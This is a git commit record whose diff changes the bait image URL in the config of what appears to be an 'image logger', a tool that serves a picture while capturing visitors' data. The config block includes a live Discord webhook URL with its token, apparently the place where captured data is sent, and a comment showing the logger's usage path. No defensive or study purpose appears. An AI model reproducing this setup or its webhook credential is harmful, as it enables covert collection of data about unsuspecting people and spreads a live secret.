d0a1841534bfb259e871d83084f8a5a9f346cafc
senbox2015-prog <senbox2015@gmail.com>
2026-01-20 18:52:05 +0000

    Update webhook image URL in main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1463220514104545570/6xAh9qPstDV9wBC82gU-B99QNV2YXgQjWHzxArUQSbr4Ekk_aRzipY80BCM8S-KFw058",
-    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.imgflip.com/5m765z.png?a490896", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
